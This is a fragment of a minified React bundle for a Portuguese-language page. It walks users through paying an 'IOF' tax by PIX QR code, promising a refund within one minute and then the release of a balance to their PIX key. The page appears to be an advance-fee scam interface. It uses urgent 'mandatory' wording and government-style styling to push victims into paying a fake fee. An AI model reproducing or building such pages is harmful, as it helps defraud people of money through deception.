                                              children: [
                                                  u.jsx("span", {
                                                      className:
                                                          "flex h-6 w-6 shrink-0 items-center justify-center border border-slate-400 bg-white text-[11px] font-bold text-[#0c3262]",
                                                      children: "1",
                                                  }),
                                                  u.jsx("span", {
                                                      children:
                                                          "Recolhimento do IOF via PIX (QR Code na tela seguinte).",
                                                  }),
                                              ],
                                          }),
                                          u.jsxs("li", {
                                              className: "flex gap-3",
                                              children: [
                                                  u.jsx("span", {
                                                      className:
                                                          "flex h-6 w-6 shrink-0 items-center justify-center border border-slate-400 bg-white text-[11px] font-bold text-[#0c3262]",
                                                      children: "2",
                                                  }),
                                                  u.jsx("span", {
                                                      children: "Confirmação e estorno automático do valor recolhido.",
                                                  }),
                                              ],
                                          }),
                                          u.jsxs("li", {
                                              className: "flex gap-3",
                                              children: [
                                                  u.jsx("span", {
                                                      className:
                                                          "flex h-6 w-6 shrink-0 items-center justify-center border border-slate-400 bg-white text-[11px] font-bold text-[#0c3262]",
                                                      children: "3",
                                                  }),
                                                  u.jsx("span", {
                                                      children:
                                                          "Liberação do saldo para saque na chave PIX cadastrada.",
                                                  }),
                                              ],
                                          }),
                                      ],
                                  }),
                              ],
                          }),
                          u.jsx("button", {
                              type: "button",
                              onClick: () => e(!0),
                              className:
                                  "mb-2 w-full border border-[#0b3d91] bg-[#1351b4] px-4 py-3 text-center text-[15px] font-semibold text-white shadow-sm hover:bg-[#0f4599] active:bg-[#0c3d88]",
                              children: "Prosseguir — pagamento IOF (PIX)",
                          }),
                          u.jsx("p", {
                              className: "text-center text-[11px] text-slate-600",
                              children: "Operação internacional · Obrigatório para finalizar · Estorno em até 1 minuto",
                          }),
                      ],
                  }),
              ],
          });
}
vf(document.getElementById("root")).render(
    u.jsx(x.StrictMode, {
        children: u.jsx(Mg, {
            children: u.jsxs(Ig, {
                children: [
                    u.jsx(ai, { path: "/pre1", element: u.jsx(Uw, {}) }),
                    u.jsx(ai, { path: "/", element: u.jsx(Lw, {}) }),
                    u.jsx(ai, { path: "/obrigatorio-f", element: u.jsx(Ww, {}) }),
                ],
            }),
        }),
    })
);
